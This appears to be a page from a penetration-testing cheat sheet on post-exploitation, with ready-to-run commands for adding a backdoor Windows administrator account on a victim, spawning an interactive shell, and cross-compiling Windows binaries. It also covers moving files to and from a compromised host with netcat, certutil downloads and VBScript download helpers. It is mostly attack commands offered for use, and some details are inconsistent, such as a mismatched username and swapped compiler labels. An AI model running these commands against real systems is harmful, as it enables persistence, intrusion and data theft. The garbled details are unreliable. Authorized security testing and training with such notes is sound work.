---
title: Exploitation
---

[Home](./)

_Ensuring you don't have to re-exploit over and over again_

## Creating Windows Admin Account
```bash
# Victim
net user /add jack sparrow
net localgroup administrators jack /add

# Connect with
rdesktop -u jim -p sparrow [IP-ADDRESS]
```

## Executing in Memory - TMPFS

```bash
mount | grep ^tmp

# Example:
# tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
# tmpfs on /tmp type tmpfs (rw,nosuid,nodev)
#
# Beware of the "noexec" flag; executing programs will fail
```

## Get full TTY shell
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Switch user

`su $USER`
`sudo -u $USER $cmd`

### Using Python Scripts without Python installed
[PyInstaller](https://github.com/pyinstaller/pyinstaller) <sup><sub>[[archive](assets/files/PyInstaller-3.6.zip)]
```bash
pyinstaller yourprogram.py
```

## Cross-compiling for Windows

#### C & C++
```bash
# Setup
apt install mingw-w64

# x86
x86_64-w64-mingw32-gcc [src.c] [-libraries] -o [dst]
i686-w64-mingw32-gcc [src.c] [-libraries] -o [dst] -lws2_32

# x64
i686-w64-mingw32-gcc [src.c] [-libraries] -o [dst]
```

#### C#
```bash
# Setup 
# Add repo with https://www.mono-project.com/download/stable/
sudo apt-get install mono-complete msbuild mono-roslyn

# Building
msbuild [src.sln]
```

## Exfiltration

- SSH Copy (scp)
```bash
scp user@hostname:/path/to/src user@hostname:/path/to/dst
```

- Netcat
```bash
# Victim
nc -nvlp $RPORT > out.file

# Kali
nc -nv $RHOST $RPORT < in.file
```

- exe2bat
```bash
# Convert a windows executable to a copy and paste set of commands
wine $(locate exe2bat.exe) nc.exe nc.txt
```

- certutil.exe
```bash
certutil.exe -urlcache -split -f “$URL” $FILENAME
```

- [zip.vbs](assets/files/zip.vbs) <sup><sub>[[copy&paste](assets/files/zip.vbs.txt)]
```bash
CScript zip.vbs $SRC $DEST
```

- [wget.vbs](assets/files/wget.vbs) <sup><sub>[[copy&paste](assets/files/wget.vbs.txt)]
```bash
CScript wget.vbs $SRC $DEST
```